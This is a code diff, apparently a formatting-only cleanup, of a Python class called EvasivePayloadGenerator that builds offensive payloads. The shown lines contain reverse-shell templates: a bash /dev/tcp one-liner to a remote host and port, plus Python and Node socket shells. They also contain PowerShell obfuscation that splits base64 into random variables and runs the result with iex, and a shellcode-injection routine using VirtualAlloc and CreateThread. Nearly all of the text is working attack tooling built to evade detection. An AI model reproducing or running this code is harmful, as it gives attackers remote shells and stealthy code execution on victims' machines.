@@ -49,9 +49,7 @@ class EvasivePayloadGenerator:
             "os.dup2(s.fileno(),2)\n"
             "subprocess.call(['/bin/sh','-i'])"
         ),
-        "bash": (
-            "bash -i >& /dev/tcp/{rhost}/{rport} 0>&1"
-        ),
+        "bash": ("bash -i >& /dev/tcp/{rhost}/{rport} 0>&1"),
         "node": (
             "(function(){{"
             "var n=require('net'),s=require('child_process').spawn('sh');"
@@ -164,20 +162,18 @@ class EvasivePayloadGenerator:
 
         if obfuscation_level >= 2:
             chunk_size = random.randint(20, 60)
-            chunks = [payload_b64[i:i + chunk_size] for i in range(0, len(payload_b64), chunk_size)]
+            chunks = [payload_b64[i : i + chunk_size] for i in range(0, len(payload_b64), chunk_size)]
             chunk_vars = [self._random_var(6) for _ in chunks]
-            chunk_assignments = ";".join(
-                f"${v}='{c}'" for v, c in zip(chunk_vars, chunks, strict=False)
-            )
+            chunk_assignments = ";".join(f"${v}='{c}'" for v, c in zip(chunk_vars, chunks, strict=False))
             combined = "+".join(f"${v}" for v in chunk_vars)
             decoder = (
-                f"$d=[System.Text.Encoding]::Unicode.GetString("
-                f"[System.Convert]::FromBase64String({combined}));"
-                f"iex $d"
+                f"$d=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String({combined}));iex $d"
             )
             return f"{prefix}{chunk_assignments};{decoder}"
 
-        return f"{prefix}iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload_b64}')))"
+        return (
+            f"{prefix}iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload_b64}')))"
+        )
 
     def generate_javascript_obfuscated(self, payload: str) -> str:
         """Generate an obfuscated JavaScript payload.
@@ -263,10 +259,10 @@ class EvasivePayloadGenerator:
 
         if injection_technique == "early_bird_apc":
             inject_code = (
-                f"${var_a}=Add-Type -memberDefinition '[DllImport(\"kernel32\")]"
+                f'${var_a}=Add-Type -memberDefinition \'[DllImport("kernel32")]'
                 f"public static extern IntPtr VirtualAlloc(IntPtr l,int s,uint t,uint p);"
-                f"[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,int z,IntPtr s,IntPtr p,uint f,IntPtr t);' "
-                f'-name \"{self._random_string(6)}\" -pasThru;'
+                f'[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,int z,IntPtr s,IntPtr p,uint f,IntPtr t);\' '
+                f'-name "{self._random_string(6)}" -pasThru;'
                 f"${var_k}={shellcode_b64};"
                 f"${var_t}=[System.Convert]::FromBase64String(${var_k});"
                 f"${var_p}=${var_a}::VirtualAlloc(0,${var_t}.Length,0x3000,0x40);"
